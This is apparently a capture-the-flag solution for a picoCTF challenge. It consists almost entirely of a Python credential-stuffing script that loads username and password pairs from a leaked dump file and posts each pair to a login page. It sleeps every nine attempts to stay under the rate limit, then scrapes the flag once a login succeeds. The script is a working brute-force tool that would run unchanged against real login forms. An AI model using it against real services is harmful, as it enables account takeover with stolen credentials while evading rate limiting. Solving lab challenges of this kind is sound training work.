💻 Exploit Script
The following Python script automates the process using the provided creds-dump.txt:

import requests
import time
import re
import sys

TARGET = 'http://candy-mountain.picoctf.net:<PORT>' # Replace with your instance port
BATCH_SIZE = 9
SLEEP_TIME = 32

# Load credentials
creds = []
with open('creds-dump.txt') as f:
    for line in f:
        user, pw = line.strip().split(';', 1)
        creds.append((user, pw))

batch_count = 0
print(f'[*] Loaded {len(creds)} credential pairs')

for user, pw in creds:
    if batch_count == BATCH_SIZE:
        print(f'\n[*] Rate limit near. Waiting {SLEEP_TIME}s for reset...')
        time.sleep(SLEEP_TIME)
        batch_count = 0
    
    batch_count += 1
    print(f'[TRY] {user}:{pw}')
    
    with requests.Session() as s:
        r = s.post(f'{TARGET}/login', data={'username': user, 'password': pw}, allow_redirects=False)
        
        # Check for successful login (Redirect 302)
        if r.status_code in (301, 302):
            print(f'\n[SUCCESS] Found credentials: {user}:{pw}')
            home = s.get(f'{TARGET}/')
            flag = re.search(r'picoCTF\{[^}]+\}', home.text)
            if flag:
                print(f'[FLAG] {flag.group(0)}')
            sys.exit(0)
                                                                                                                                                                       
